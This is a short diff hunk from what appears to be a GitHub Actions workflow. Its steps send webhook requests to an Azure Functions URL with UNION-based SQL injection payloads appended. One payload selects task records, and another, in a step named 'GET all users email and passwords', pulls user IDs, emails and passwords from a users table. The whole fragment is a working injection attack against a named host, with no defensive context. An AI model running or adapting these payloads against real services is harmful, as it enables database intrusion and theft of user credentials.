@@ -12,7 +12,7 @@ jobs:
       uses: distributhor/workflow-webhook
       with:
         url: "https://nsc-func-dev-usw2-tuesday.azurewebsites.net/api/users/14641 UNION SELECT taskId, taskUserId, title, taskDescription FROM tasks/tasks"
-     - name: GET all users email and passwords
+    - name: GET all users email and passwords
       uses: distributhor/workflow-webhook
       with:
         url: "https://nsc-func-dev-usw2-tuesday.azurewebsites.net/api/users/14641 UNION select userid, userid, email, userpassword from users/tasks"    
